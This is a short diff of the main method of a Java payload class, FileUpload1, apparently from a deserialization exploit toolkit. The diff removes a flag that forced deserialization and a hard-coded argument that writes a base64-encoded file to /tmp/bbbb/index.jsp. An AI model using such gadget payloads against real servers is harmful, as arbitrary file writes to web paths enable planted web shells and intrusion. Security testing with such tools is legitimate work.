@@ -113,8 +113,6 @@ public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
 
 
     public static void main ( String[] args ) throws Exception {
-        PayloadRunner.runDeserialize = true;
-        args = new String[] {"writeOldB64;/tmp/bbbb/index.jsp;aGVsbG8K"};
         PayloadRunner.run(FileUpload1.class, args);
     }
 
